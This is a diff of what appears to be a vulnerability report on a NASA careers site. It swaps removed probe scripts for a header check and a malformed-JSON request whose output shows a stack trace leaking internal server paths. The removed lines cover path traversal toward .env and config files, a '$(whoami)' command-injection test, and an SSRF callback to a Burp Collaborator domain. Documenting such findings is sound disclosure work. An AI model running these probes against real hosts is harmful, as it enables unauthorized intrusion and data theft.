@@ -194,24 +194,24 @@ eNvH/tpHuJOyzSBN8BmuWd8XIGLpcxBzr5YLp3OB21A
 
 
 ```
-# 1. Check for common sensitive files at leaked path:
-for file in ".env" "config.js" "package.json" "web.config"; do
-  echo -n "Testing $file: "
-  curl -s -o /dev/null -w "%{http_code}" \
-    "https://sciencecareers.apps.nasa.gov/static/../../$file" 2>/dev/null
-  echo
-done
-
-# 2. Test for command injection in error handling (non-destructive):
-curl -s -X POST \
+ajdev@rootbox:~$ curl -sI https://sciencecareers.apps.nasa.gov/ | grep -i "x-powered-by"
+x-powered-by: Express
+x-powered-by: ARR/3.0
+ajdev@rootbox:~$ curl -s -X GET \
   -H "Content-Type: application/json" \
-  -d '{"test":"$(whoami)"}' \
-  https://sciencecareers.apps.nasa.gov/api/test 2>/dev/null | grep -i "root\|admin"
+  -d "t" \
+  https://sciencecareers.apps.nasa.gov/ \
+  -w "\nHTTP Status: %{http_code}\n"
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Error</title>
+</head>
+<body>
+<pre>SyntaxError: Unexpected token t in JSON at position 0<br> &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at createStrictSyntaxError (C:\inetpub\wwwroot\ScienceCareerPath\node_modules\body-parser\lib\types\json.js:158:10)<br> &nbsp; &nbsp;at parse (C:\inetpub\wwwroot\ScienceCareerPath\node_modules\body-parser\lib\types\json.js:83:15)<br> &nbsp; &nbsp;at C:\inetpub\wwwroot\ScienceCareerPath\node_modules\body-parser\lib\read.js:121:18<br> &nbsp; &nbsp;at invokeCallback (C:\inetpub\wwwroot\ScienceCareerPath\node_modules\raw-body\index.js:224:16)<br> &nbsp; &nbsp;at done (C:\inetpub\wwwroot\ScienceCareerPath\node_modules\raw-body\index.js:213:7)<br> &nbsp; &nbsp;at IncomingMessage.onEnd (C:\inetpub\wwwroot\ScienceCareerPath\node_modules\raw-body\index.js:273:7)<br> &nbsp; &nbsp;at IncomingMessage.emit (node:events:517:28)<br> &nbsp; &nbsp;at endReadableNT (node:internal/streams/readable:1400:12)<br> &nbsp; &nbsp;at process.processTicksAndRejections (node:internal/process/task_queues:82:21)</pre>
+</body>
+</html>
 
-# 3. Check for SSRF via error reflection:
-curl -s -X POST \
-  -H "Content-Type: application/json" \
-  -d '{"url":"http://YOUR_INTERACTSH_DOMAIN.burpcollaborator.net"}' \
-  https://sciencecareers.apps.nasa.gov/api/fetch 2>/dev/null
-# Then check your Interactsh/Burp Collaborator for callbacks
+HTTP Status: 400
 ```
